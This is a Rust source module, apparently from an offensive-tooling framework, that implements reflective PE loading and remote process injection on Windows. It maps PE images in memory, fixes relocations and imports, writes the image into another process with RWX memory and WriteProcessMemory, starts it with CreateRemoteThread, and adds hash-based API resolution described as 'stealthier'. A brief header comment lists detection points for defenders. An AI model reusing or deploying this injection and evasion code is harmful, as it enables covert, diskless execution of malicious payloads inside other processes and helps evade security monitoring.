//! Reflective PE Injection for diskless in-memory execution.
//!
//! This module provides capabilities for loading and executing PE files
//! entirely in memory without touching disk:
//! - PE parsing and validation
//! - Manual mapping (sections, relocations, imports)
//! - Local process execution
//! - Remote process injection
//! - Integration with rspe crate
//!
//! Detection points for defenders:
//! - Unbacked executable memory regions
//! - Memory with RWX permissions
//! - PE headers in non-file-backed memory
//! - Import resolution patterns
//! - Thread creation from unusual addresses

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use std::collections::HashMap;
use std::error::Error;
use std::ptr::{null, null_mut};

use winapi::shared::minwindef::{DWORD, FARPROC, HMODULE, LPVOID, WORD};
use winapi::shared::ntdef::{HANDLE, NTSTATUS, PVOID};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use winapi::um::memoryapi::{VirtualAlloc, VirtualAllocEx, VirtualFree, VirtualProtect, WriteProcessMemory};
use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::{
    IMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT,
    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR,
    IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, IMAGE_ORDINAL_FLAG64, IMAGE_REL_BASED_DIR64,
    IMAGE_REL_BASED_HIGHLOW, IMAGE_SECTION_HEADER, IMAGE_THUNK_DATA64,
    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
    PAGE_READONLY, PAGE_READWRITE, PROCESS_ALL_ACCESS,
};

/// Error types for reflective PE operations
#[derive(Debug)]
pub enum ReflectiveError {
    InvalidDosSignature,
    InvalidNtSignature,
    InvalidArchitecture,
    AllocationFailed,
    RelocationFailed,
    ImportResolutionFailed(String),
    InjectionFailed,
    ThreadCreationFailed,
    ProcessOpenFailed,
}

impl std::fmt::Display for ReflectiveError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::InvalidDosSignature => write!(f, "Invalid DOS signature"),
            Self::InvalidNtSignature => write!(f, "Invalid NT signature"),
            Self::InvalidArchitecture => write!(f, "Invalid architecture (expected x64)"),
            Self::AllocationFailed => write!(f, "Memory allocation failed"),
            Self::RelocationFailed => write!(f, "Relocation processing failed"),
            Self::ImportResolutionFailed(dll) => write!(f, "Import resolution failed for {}", dll),
            Self::InjectionFailed => write!(f, "Injection failed"),
            Self::ThreadCreationFailed => write!(f, "Thread creation failed"),
            Self::ProcessOpenFailed => write!(f, "Failed to open target process"),
        }
    }
}

impl std::error::Error for ReflectiveError {}

/// Parsed PE information
pub struct ParsedPe<'a> {
    /// Raw PE bytes
    pub raw: &'a [u8],
    /// DOS header
    pub dos_header: &'a IMAGE_DOS_HEADER,
    /// NT headers
    pub nt_headers: &'a IMAGE_NT_HEADERS64,
    /// Section headers
    pub sections: &'a [IMAGE_SECTION_HEADER],
    /// Preferred image base
    pub image_base: u64,
    /// Size of image when loaded
    pub image_size: u32,
    /// Entry point RVA
    pub entry_point: u32,
}

impl<'a> ParsedPe<'a> {
    /// Parse a PE file from bytes
    pub fn parse(pe_bytes: &'a [u8]) -> Result<Self, ReflectiveError> {
        if pe_bytes.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
            return Err(ReflectiveError::InvalidDosSignature);
        }

        let dos_header = unsafe { &*(pe_bytes.as_ptr() as *const IMAGE_DOS_HEADER) };

        // Validate DOS signature
        if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
            return Err(ReflectiveError::InvalidDosSignature);
        }

        let nt_headers_offset = dos_header.e_lfanew as usize;
        if pe_bytes.len() < nt_headers_offset + std::mem::size_of::<IMAGE_NT_HEADERS64>() {
            return Err(ReflectiveError::InvalidNtSignature);
        }

        let nt_headers = unsafe {
            &*(pe_bytes.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS64)
        };

        // Validate NT signature
        if nt_headers.Signature != IMAGE_NT_SIGNATURE {
            return Err(ReflectiveError::InvalidNtSignature);
        }

        // Validate architecture (x64)
        if nt_headers.FileHeader.Machine != 0x8664 {
            return Err(ReflectiveError::InvalidArchitecture);
        }

        let num_sections = nt_headers.FileHeader.NumberOfSections as usize;
        let sections_offset = nt_headers_offset
            + std::mem::size_of::<u32>() // Signature
            + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
            + nt_headers.FileHeader.SizeOfOptionalHeader as usize;

        let sections = unsafe {
            std::slice::from_raw_parts(
                pe_bytes.as_ptr().add(sections_offset) as *const IMAGE_SECTION_HEADER,
                num_sections,
            )
        };

        Ok(Self {
            raw: pe_bytes,
            dos_header,
            nt_headers,
            sections,
            image_base: nt_headers.OptionalHeader.ImageBase,
            image_size: nt_headers.OptionalHeader.SizeOfImage,
            entry_point: nt_headers.OptionalHeader.AddressOfEntryPoint,
        })
    }
}

/// Reflective PE loader
pub struct ReflectiveLoader {
    /// Allocated base address
    base_address: *mut c_void,
    /// Entry point address
    entry_point: *mut c_void,
    /// Image size
    image_size: usize,
}

impl ReflectiveLoader {
    /// Load a PE into the current process
    pub unsafe fn load_local(pe_bytes: &[u8]) -> Result<Self, ReflectiveError> {
        let pe = ParsedPe::parse(pe_bytes)?;

        // Allocate memory for the image
        let base = VirtualAlloc(
            null_mut(),
            pe.image_size as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if base.is_null() {
            return Err(ReflectiveError::AllocationFailed);
        }

        // Copy headers
        std::ptr::copy_nonoverlapping(
            pe.raw.as_ptr(),
            base as *mut u8,
            pe.nt_headers.OptionalHeader.SizeOfHeaders as usize,
        );

        // Copy sections
        for section in pe.sections {
            if section.SizeOfRawData == 0 {
                continue;
            }

            let section_dest = (base as usize + section.VirtualAddress as usize) as *mut u8;
            let section_src = pe.raw.as_ptr().add(section.PointerToRawData as usize);
            let section_size = section.SizeOfRawData as usize;

            std::ptr::copy_nonoverlapping(section_src, section_dest, section_size);
        }

        // Process relocations
        let delta = base as u64 - pe.image_base;
        if delta != 0 {
            Self::process_relocations(base, &pe, delta)?;
        }

        // Resolve imports
        Self::resolve_imports(base, &pe)?;

        // Set section protections
        Self::set_section_protections(base, &pe)?;

        let entry = (base as usize + pe.entry_point as usize) as *mut c_void;

        Ok(Self {
            base_address: base,
            entry_point: entry,
            image_size: pe.image_size as usize,
        })
    }

    /// Process base relocations
    unsafe fn process_relocations(
        base: *mut c_void,
        pe: &ParsedPe,
        delta: u64,
    ) -> Result<(), ReflectiveError> {
        let reloc_dir = &pe.nt_headers.OptionalHeader.DataDirectory
            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];

        if reloc_dir.VirtualAddress == 0 {
            return Ok(()); // No relocations
        }

        let mut reloc_ptr = (base as usize + reloc_dir.VirtualAddress as usize)
            as *const IMAGE_BASE_RELOCATION;
        let reloc_end = reloc_ptr as usize + reloc_dir.Size as usize;

        while (reloc_ptr as usize) < reloc_end {
            let block = &*reloc_ptr;
            if block.SizeOfBlock == 0 {
                break;
            }

            let num_entries = (block.SizeOfBlock as usize
                - std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                / std::mem::size_of::<u16>();

            let entries = std::slice::from_raw_parts(
                (reloc_ptr as *const u8).add(std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                    as *const u16,
                num_entries,
            );

            for &entry in entries {
                let reloc_type = entry >> 12;
                let offset = entry & 0x0FFF;
                let addr = (base as usize + block.VirtualAddress as usize + offset as usize)
                    as *mut u64;

                match reloc_type as u32 {
                    IMAGE_REL_BASED_DIR64 => {
                        *addr = (*addr).wrapping_add(delta);
                    }
                    IMAGE_REL_BASED_HIGHLOW => {
                        let addr32 = addr as *mut u32;
                        *addr32 = (*addr32).wrapping_add(delta as u32);
                    }
                    0 => {} // IMAGE_REL_BASED_ABSOLUTE - skip
                    _ => {}
                }
            }

            reloc_ptr = (reloc_ptr as usize + block.SizeOfBlock as usize)
                as *const IMAGE_BASE_RELOCATION;
        }

        Ok(())
    }

    /// Resolve import table
    unsafe fn resolve_imports(base: *mut c_void, pe: &ParsedPe) -> Result<(), ReflectiveError> {
        let import_dir = &pe.nt_headers.OptionalHeader.DataDirectory
            [IMAGE_DIRECTORY_ENTRY_IMPORT as usize];

        if import_dir.VirtualAddress == 0 {
            return Ok(()); // No imports
        }

        let mut import_desc = (base as usize + import_dir.VirtualAddress as usize)
            as *const IMAGE_IMPORT_DESCRIPTOR;

        while (*import_desc).Name != 0 {
            let dll_name = (base as usize + (*import_desc).Name as usize) as *const i8;
            let dll_name_str = std::ffi::CStr::from_ptr(dll_name)
                .to_string_lossy()
                .to_string();

            // Load the DLL
            let dll_handle = LoadLibraryA(dll_name);
            if dll_handle.is_null() {
                return Err(ReflectiveError::ImportResolutionFailed(dll_name_str));
            }

            // Get thunk arrays
            let mut orig_thunk = if *(*import_desc).u.OriginalFirstThunk() != 0 {
                (base as usize + *(*import_desc).u.OriginalFirstThunk() as usize)
                    as *const IMAGE_THUNK_DATA64
            } else {
                (base as usize + (*import_desc).FirstThunk as usize) as *const IMAGE_THUNK_DATA64
            };

            let mut thunk = (base as usize + (*import_desc).FirstThunk as usize)
                as *mut IMAGE_THUNK_DATA64;

            while *(*orig_thunk).u1.AddressOfData() != 0 {
                let func_addr = if *(*orig_thunk).u1.Ordinal() & IMAGE_ORDINAL_FLAG64 != 0 {
                    // Import by ordinal
                    let ordinal = (*(*orig_thunk).u1.Ordinal() & 0xFFFF) as u16;
                    GetProcAddress(dll_handle, ordinal as usize as *const i8)
                } else {
                    // Import by name
                    let import_by_name = (base as usize
                        + *(*orig_thunk).u1.AddressOfData() as usize)
                        as *const IMAGE_IMPORT_BY_NAME;
                    GetProcAddress(dll_handle, (*import_by_name).Name.as_ptr() as *const i8)
                };

                if func_addr.is_null() {
                    return Err(ReflectiveError::ImportResolutionFailed(dll_name_str));
                }

                *(*thunk).u1.Function_mut() = func_addr as u64;

                orig_thunk = orig_thunk.add(1);
                thunk = thunk.add(1);
            }

            import_desc = import_desc.add(1);
        }

        Ok(())
    }

    /// Set proper memory protections for each section
    unsafe fn set_section_protections(
        base: *mut c_void,
        pe: &ParsedPe,
    ) -> Result<(), ReflectiveError> {
        for section in pe.sections {
            let characteristics = section.Characteristics;
            let section_base = (base as usize + section.VirtualAddress as usize) as *mut c_void;
            let section_size = section.Misc.VirtualSize() as usize;

            if section_size == 0 {
                continue;
            }

            // Determine protection based on characteristics
            let protection = if characteristics & 0x20000000 != 0 {
                // IMAGE_SCN_MEM_EXECUTE
                if characteristics & 0x80000000 != 0 {
                    // IMAGE_SCN_MEM_WRITE
                    PAGE_EXECUTE_READWRITE
                } else {
                    PAGE_EXECUTE_READ
                }
            } else if characteristics & 0x80000000 != 0 {
                PAGE_READWRITE
            } else {
                PAGE_READONLY
            };

            let mut old_protect: DWORD = 0;
            VirtualProtect(section_base, section_size, protection, &mut old_protect);
        }

        Ok(())
    }

    /// Execute the loaded PE's entry point (DllMain for DLLs)
    pub unsafe fn execute(&self) -> Result<usize, ReflectiveError> {
        // Entry point signature: BOOL WINAPI DllMain(HINSTANCE, DWORD, LPVOID)
        type DllMain = unsafe extern "system" fn(HMODULE, DWORD, LPVOID) -> i32;

        let entry: DllMain = std::mem::transmute(self.entry_point);
        let result = entry(self.base_address as HMODULE, 1, null_mut()); // DLL_PROCESS_ATTACH

        Ok(result as usize)
    }

    /// Execute as EXE entry point
    pub unsafe fn execute_exe(&self) -> Result<usize, ReflectiveError> {
        type ExeMain = unsafe extern "C" fn() -> i32;

        let entry: ExeMain = std::mem::transmute(self.entry_point);
        let result = entry();

        Ok(result as usize)
    }

    /// Get the base address
    pub fn base_address(&self) -> *mut c_void {
        self.base_address
    }

    /// Get the entry point
    pub fn entry_point(&self) -> *mut c_void {
        self.entry_point
    }
}

impl Drop for ReflectiveLoader {
    fn drop(&mut self) {
        if !self.base_address.is_null() {
            unsafe {
                VirtualFree(self.base_address, 0, MEM_RELEASE);
            }
        }
    }
}

/// Inject PE into a remote process
pub struct RemoteInjector;

impl RemoteInjector {
    /// Inject a PE into a remote process by PID
    pub unsafe fn inject(pe_bytes: &[u8], target_pid: u32) -> Result<HANDLE, ReflectiveError> {
        let pe = ParsedPe::parse(pe_bytes)?;

        // Open target process
        let process = OpenProcess(PROCESS_ALL_ACCESS, 0, target_pid);
        if process.is_null() {
            return Err(ReflectiveError::ProcessOpenFailed);
        }

        // Allocate memory in target
        let remote_base = VirtualAllocEx(
            process,
            null_mut(),
            pe.image_size as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_base.is_null() {
            CloseHandle(process);
            return Err(ReflectiveError::AllocationFailed);
        }

        // Prepare local image first
        let local_loader = ReflectiveLoader::load_local(pe_bytes)?;

        // Rebase for remote address
        let delta = remote_base as u64 - local_loader.base_address as u64;
        if delta != 0 {
            Self::rebase_for_remote(local_loader.base_address, &pe, delta)?;
        }

        // Write to remote process
        let mut bytes_written: usize = 0;
        let result = WriteProcessMemory(
            process,
            remote_base,
            local_loader.base_address,
            pe.image_size as usize,
            &mut bytes_written,
        );

        if result == 0 {
            CloseHandle(process);
            return Err(ReflectiveError::InjectionFailed);
        }

        // Calculate remote entry point
        let remote_entry = (remote_base as usize + pe.entry_point as usize) as LPVOID;

        // Create remote thread
        let mut thread_id: DWORD = 0;
        let thread = CreateRemoteThread(
            process,
            null_mut(),
            0,
            Some(std::mem::transmute(remote_entry)),
            null_mut(),
            0,
            &mut thread_id,
        );

        if thread.is_null() {
            CloseHandle(process);
            return Err(ReflectiveError::ThreadCreationFailed);
        }

        CloseHandle(process);
        Ok(thread)
    }

    /// Rebase relocations for remote address
    unsafe fn rebase_for_remote(
        base: *mut c_void,
        pe: &ParsedPe,
        delta: u64,
    ) -> Result<(), ReflectiveError> {
        ReflectiveLoader::process_relocations(base, pe, delta)
    }
}

/// Using rspe crate for reflective loading (simpler API)
pub mod rspe_loader {
    use super::*;

    /// Load PE using rspe crate
    #[cfg(feature = "rspe")]
    pub unsafe fn load(pe_bytes: &[u8]) -> Result<*mut c_void, ReflectiveError> {
        rspe::reflective_loader(pe_bytes)
            .map(|p| p as *mut c_void)
            .map_err(|_| ReflectiveError::AllocationFailed)
    }

    /// Load and execute PE using rspe
    #[cfg(feature = "rspe")]
    pub unsafe fn load_and_execute(pe_bytes: &[u8]) -> Result<i32, ReflectiveError> {
        let base = load(pe_bytes)?;

        // Parse to get entry point
        let pe = ParsedPe::parse(pe_bytes)?;
        let entry = (base as usize + pe.entry_point as usize) as *const c_void;

        type DllMain = unsafe extern "system" fn(HMODULE, DWORD, LPVOID) -> i32;
        let func: DllMain = std::mem::transmute(entry);

        Ok(func(base as HMODULE, 1, null_mut()))
    }
}

/// Shellcode-style reflective loader stub generator
pub mod shellcode {
    use super::*;

    /// Generate position-independent loader shellcode
    /// This creates shellcode that can load a PE from memory
    pub fn generate_loader_stub() -> Vec<u8> {
        // This is a placeholder - actual implementation would generate
        // position-independent assembly that:
        // 1. Finds kernel32 via PEB
        // 2. Resolves VirtualAlloc, LoadLibrary, GetProcAddress
        // 3. Maps the PE sections
        // 4. Processes relocations
        // 5. Resolves imports
        // 6. Calls entry point

        // For now, return empty - real implementation would be complex
        Vec::new()
    }

    /// Prepend loader stub to PE for self-loading shellcode
    pub fn create_self_loading_pe(pe_bytes: &[u8]) -> Vec<u8> {
        let stub = generate_loader_stub();
        let mut result = stub;
        result.extend_from_slice(pe_bytes);
        result
    }
}

/// Integration with PIC module for stealthier API resolution
pub mod pic_integration {
    use super::*;
    use crate::pic;

    /// Load PE using PIC-style API resolution
    pub unsafe fn load_with_pic(pe_bytes: &[u8]) -> Result<ReflectiveLoader, ReflectiveError> {
        let pe = ParsedPe::parse(pe_bytes)?;

        // Use PIC module for allocation (avoids import table)
        let base = pic::pic_alloc_exec(pe.image_size as usize)
            .ok_or(ReflectiveError::AllocationFailed)?;

        // Copy headers
        std::ptr::copy_nonoverlapping(
            pe.raw.as_ptr(),
            base as *mut u8,
            pe.nt_headers.OptionalHeader.SizeOfHeaders as usize,
        );

        // Copy sections
        for section in pe.sections {
            if section.SizeOfRawData == 0 {
                continue;
            }

            let section_dest = (base as usize + section.VirtualAddress as usize) as *mut u8;
            let section_src = pe.raw.as_ptr().add(section.PointerToRawData as usize);
            let section_size = section.SizeOfRawData as usize;

            std::ptr::copy_nonoverlapping(section_src, section_dest, section_size);
        }

        // Process relocations
        let delta = base as u64 - pe.image_base;
        if delta != 0 {
            ReflectiveLoader::process_relocations(base, &pe, delta)?;
        }

        // Resolve imports using PIC-resolved LoadLibrary/GetProcAddress
        resolve_imports_pic(base, &pe)?;

        let entry = (base as usize + pe.entry_point as usize) as *mut c_void;

        Ok(ReflectiveLoader {
            base_address: base,
            entry_point: entry,
            image_size: pe.image_size as usize,
        })
    }

    /// Resolve imports using PIC-resolved functions
    unsafe fn resolve_imports_pic(
        base: *mut c_void,
        pe: &ParsedPe,
    ) -> Result<(), ReflectiveError> {
        // Get LoadLibraryA and GetProcAddress via PIC
        let load_library: pic::FnLoadLibraryA = pic::resolve_api(
            pic::hashes::KERNEL32_DLL,
            pic::hashes::LOAD_LIBRARY_A,
        )
        .map(|p| std::mem::transmute(p))
        .ok_or(ReflectiveError::ImportResolutionFailed("kernel32".into()))?;

        let get_proc: pic::FnGetProcAddress = pic::resolve_api(
            pic::hashes::KERNEL32_DLL,
            pic::hashes::GET_PROC_ADDRESS,
        )
        .map(|p| std::mem::transmute(p))
        .ok_or(ReflectiveError::ImportResolutionFailed("kernel32".into()))?;

        let import_dir = &pe.nt_headers.OptionalHeader.DataDirectory
            [IMAGE_DIRECTORY_ENTRY_IMPORT as usize];

        if import_dir.VirtualAddress == 0 {
            return Ok(());
        }

        let mut import_desc = (base as usize + import_dir.VirtualAddress as usize)
            as *const IMAGE_IMPORT_DESCRIPTOR;

        while (*import_desc).Name != 0 {
            let dll_name = (base as usize + (*import_desc).Name as usize) as *const i8;

            let dll_handle = load_library(dll_name);
            if dll_handle.is_null() {
                let dll_str = std::ffi::CStr::from_ptr(dll_name).to_string_lossy();
                return Err(ReflectiveError::ImportResolutionFailed(dll_str.to_string()));
            }

            let mut orig_thunk = if *(*import_desc).u.OriginalFirstThunk() != 0 {
                (base as usize + *(*import_desc).u.OriginalFirstThunk() as usize)
                    as *const IMAGE_THUNK_DATA64
            } else {
                (base as usize + (*import_desc).FirstThunk as usize) as *const IMAGE_THUNK_DATA64
            };

            let mut thunk = (base as usize + (*import_desc).FirstThunk as usize)
                as *mut IMAGE_THUNK_DATA64;

            while *(*orig_thunk).u1.AddressOfData() != 0 {
                let func_addr = if *(*orig_thunk).u1.Ordinal() & IMAGE_ORDINAL_FLAG64 != 0 {
                    let ordinal = (*(*orig_thunk).u1.Ordinal() & 0xFFFF) as u16;
                    get_proc(dll_handle, ordinal as usize as *const i8)
                } else {
                    let import_by_name = (base as usize
                        + *(*orig_thunk).u1.AddressOfData() as usize)
                        as *const IMAGE_IMPORT_BY_NAME;
                    get_proc(dll_handle, (*import_by_name).Name.as_ptr() as *const i8)
                };

                *(*thunk).u1.Function_mut() = func_addr as u64;

                orig_thunk = orig_thunk.add(1);
                thunk = thunk.add(1);
            }

            import_desc = import_desc.add(1);
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pe_parsing() {
        // Minimal DOS header for testing
        let mut pe_bytes = vec![0u8; 512];
        pe_bytes[0] = 0x4D; // M
        pe_bytes[1] = 0x5A; // Z

        // This would fail because we don't have valid NT headers
        let result = ParsedPe::parse(&pe_bytes);
        assert!(result.is_err());
    }
}
